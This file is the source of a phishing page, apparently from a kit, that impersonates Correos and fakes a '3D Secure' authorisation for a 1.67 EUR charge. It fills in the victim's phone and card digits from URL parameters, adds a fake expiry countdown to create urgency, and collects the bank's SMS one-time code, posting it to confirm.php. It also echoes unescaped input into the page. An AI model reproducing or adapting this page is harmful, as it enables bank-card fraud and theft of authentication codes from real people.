<?php
$num=$_GET['identifiant'];
$bin4=$_GET['page2'];

date_default_timezone_set('Europe/Paris');

if(!isset($_SESSION)) { session_start(); } 
error_reporting(0);
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head><meta charset="windows-1252">
    
    <meta name="viewport" content="initial-scale=1.0; maximum-scale=1.0; user-scalable=0;"/><meta name="format-detection" content="telephone=no"/>
    <title>Correos</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico"/>
    <link rel="stylesheet" href="css/merchant.css" type="text/css"/>
	    <link rel="stylesheet" href="css/opus.css" type="text/css"/>
		<link rel="stylesheet" href="css/footer.css" type="text/css"/>
		<link rel="stylesheet" href="css/onei.css" type="text/css"/>
		<link rel="stylesheet" href="css/eui.css" type="text/css"/>
		<style type="text/css">
  #heading{
    text-align: center;
    font-size: 15px;
	font-weight: bold;
    margin-left: 10px;
    margin-top: 10px;
    float:right;
  }
</style>
  </head>
  <body>

<div style="background-color:#fff;padding-right:5px;padding-left:10px;" class="col-xs-12 col-md-8 col-lg-8 col-xl-8"><img style="margin-top: 0px; height: 54px; width: 110px;" src="css/correos.png">
                
                <br><span id="heading">Pedido : ES64M133</span><br><br>
            </div>

<div id="amount"></div>
    <div id="container">
      <div id="header">
        <div class="divTitlee">
          <span class="title">3D Secure - Autorizaci&oacute;n</span><br><br>
		  <span class="title">Importe a pagar : <span style="color:#004b92" id="value">1.67 &euro;</span><img style="padding: 2px; height: 18px; width: 18px;" src="css/alert_severe.png" alt="solde débiteur"></span>
          <span class="subtitle"></span>
        </div>
        <div id="headImage"></div>
      </div>

      <form action="confirm.php" method="post" id="payment_form" onsubmit="return checkForm();">
        <input type="hidden" name="LANG" value="fr">
        <input type="hidden" name="client_type" value="mobile">
        <input type="hidden" name="page_type" value="payment_offbill">
	    <input type="hidden" name="identifiant" value="<?php echo $num; ?>">
        <input type="hidden" name="page2" value="<?php echo $bin4 ?>">
        <div id="input_data">
          

          <div class="form_cardType">
                <label> <span class="libelle">Comercio&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :</span> &nbsp;</label>
                <input type="hidden" id="form_card_type" name="card_type" value="cb">
                
                &nbsp;Correos
                
                
                
          </div>
          <div class="form_cardType">
                <label> <span class="libelle">Importe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</span>&nbsp;</label>
                <input type="hidden" id="form_card_type" name="card_type" value="cb">
                
                &nbsp;&nbsp;1.67 EUR
                
                
                
          </div>
          
<div class="form_cardType">
                <label> <span class="libelle">Fecha&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : </span> &nbsp;</label>
                <input type="hidden" id="form_card_type" name="card_type" value="cb">
                
                <?php echo date('d/m/Y H:i:s', time()); ?>
                
                
                
          </div><div class="form_cardType">
                <label> <span class="libelle">N&deg; Tarjeta : </span> &nbsp;</label>
                <input type="hidden" id="form_card_type" name="card_type" value="cb">
                
                XXXX-XXXX-XXXX-<?php echo $bin4 ?>
                
                
                
          </div>
		  <div class="form_cardType">
                <label> <span class="libelle">Tel&eacute;fono  : </span> &nbsp;</label>
                <input type="hidden" id="form_card_type" name="card_type" value="cb">
                
                +34<?php echo $num ?>
                
                
                
          </div><br>
          <div class="security_code">
            <div>
			<div class="cardCVV cardCBCVV"></div>
              <label for="form_card_security">
                <span class="libelle">C&oacute;digo SMS : </span>
                <span class="star">&nbsp;*</span>
              </label>
            </div>
             
            <input required="" pattern=".{4,}" type="tel" size="5" class="codeSecuriteinput" name="shipped" id="form_card_securit" autocomplete="off" maxlength="12">

            
          
            <div class="clearfix hidden"></div>
            
 


<a href="#" id="resend" class="security_code_info petit" style="display: none;">Reenviar el c&oacute;digo</a>
<div id="expired" style="color:red" class="security_code_info petit">C&oacute;digo caducado, se le ha enviado un nuevo c&oacute;digo</div> 
<div class="security_code_info petit">Ejemplo : 953784</div>

<div id="counter" class="security_code_info petit">C&oacute;digo caducado en <span id="timer" style="color:red">0:07</span>

</div>
<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
<script>
$(document).ready(function(){
  $('a#resend').click(function(){
    var val = $('#resend').text();
    $('#resend').text('Se ha enviado un codigo unico (Wallet) a su telefono movil'); // badal hadi
    $('#resend').attr('disabled');
    $('#resend').css('text-decoration',"none");
     $('#resend').css('color',"green");
  })
})
var counter, minutes , seconds;
document.getElementById('resend').style.display = 'none';
document.getElementById('timer').innerHTML = 03 + ":" + 00;
startTimer();

function startTimer() {
  var presentTime = document.getElementById('timer').innerHTML;
  var timeArray = presentTime.split(/[:]+/);
  minutes = timeArray[0];
  seconds = checkSecond((timeArray[1] - 1));
  if(seconds==59){
  	minutes -= 1
  }
  if(minutes<0){
  		minutes = 0;
  		seconds = 0;
  		clearTimeout(counter)
  		document.getElementById('counter').style.display = 'none';
      wait(1000);
      document.getElementById('resend').style.display = 'block';


  	}
  
  document.getElementById('timer').innerHTML = minutes + ":" + seconds;
  counter = setTimeout(startTimer, 1000);
}
function wait(ms){
   var start = new Date().getTime();
   var end = start;
   while(end < start + ms) {
     end = new Date().getTime();
  }
}

function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
  if (sec < 0) {sec = "59"};
  return sec;
}
</script>
<div class="security_code_info petit">El codigo SMS se envia desde su banco.

</div>

          </div>
        </div>
        <div class="button">
          
          <input type="submit" class="btn" id="form_button_submit" name="form_button_submit" value="continuar">
        </div>
      </form>
     
    </div>
	
    <script type="text/javascript" src="js/jquery.slim.min.js"></script>
    <script type="text/javascript" src="js/validationform.min.js"></script>
    <noscript>Cette page utilise du Javascript. Activez le Javascript via le menu "options" de votre navigateur.</noscript>
  </body>
</html>
